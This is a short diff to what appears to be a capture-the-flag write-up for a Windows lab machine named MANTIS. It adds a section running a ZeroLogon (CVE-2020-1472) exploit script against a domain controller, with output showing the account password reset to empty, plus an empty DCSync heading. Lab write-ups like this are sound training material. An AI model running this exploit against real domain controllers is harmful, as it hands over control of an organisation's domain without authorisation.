@@ -441,3 +441,19 @@ These look to be domain credentials as well
 Since this version of windows is so old its likely vulnerable to a lot of different things
 
 # Domain admin
+## ZeroLogon
+```python
+python3 cve-2020-1472-exploit.py MANTIS 10.129.17.20
+Performing authentication attempts...
+====================================================================================================================================================================
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!
+```
+
+## DCSync
+```python
+
+```
